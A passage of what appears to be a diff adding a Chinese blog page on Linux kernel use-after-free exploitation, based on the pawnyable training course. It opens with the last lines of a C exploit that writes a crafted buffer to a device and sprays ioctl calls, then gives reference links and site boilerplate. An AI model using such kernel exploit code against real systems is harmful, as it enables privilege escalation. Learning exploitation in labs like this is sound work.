class="hljs-number">0x2f</span>] = user_ss;  <br>	write(fd2, buf, <span class="hljs-number">0x400</span>);<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++)<br>		ioctl(spray[i], <span class="hljs-number">0</span>, g_buf+<span class="hljs-number">0x100</span>);	<br>		<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://blog-wohin-me.translate.goog/posts/pawnyable-0203/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl">https://blog-wohin-me.translate.goog/posts/pawnyable-0203/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl</a></p>
+<p><a target="_blank" rel="noopener" href="https://pawnyable-cafe.translate.goog/linux-kernel/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=zh-CN">https://pawnyable-cafe.translate.goog/linux-kernel/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=zh-CN</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://h0pe-ay.github.io/Kernel-Pwn-UAF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>hope</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/KernelPwn-AAR&amp;AAW/" title="Kernel-Pwn-AAR&amp;AAW">
+                        <span class="hidden-mobile">Kernel-Pwn-AAR&amp;AAW</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
